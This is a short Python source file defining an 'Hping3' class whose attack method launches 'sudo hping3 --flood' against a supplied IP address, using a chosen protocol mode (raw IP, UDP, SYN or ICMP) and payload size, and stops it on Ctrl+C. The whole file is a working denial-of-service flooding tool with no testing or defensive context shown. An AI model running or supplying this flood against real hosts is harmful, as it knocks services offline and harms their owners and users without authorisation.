import subprocess
import signal
import os

class Hping3(object):
    def __init__(self, IP):
        self.IP = IP 

    def attack(self, method, payload):
        # rawip udp syn icmp
        proc = subprocess.Popen(["sudo", "hping3", "-d", f"{payload}", f"--{method}", "--flood", f"{self.IP}"], preexec_fn=os.setsid)
        try:
            # Waits for the termination of the process
            proc.wait()
        except KeyboardInterrupt:
            print("\nCtrl+C! Closing hping3...")
            os.killpg(os.getpgid(proc.pid), signal.SIGINT)  # send SIGINT to hping3
            proc.wait()

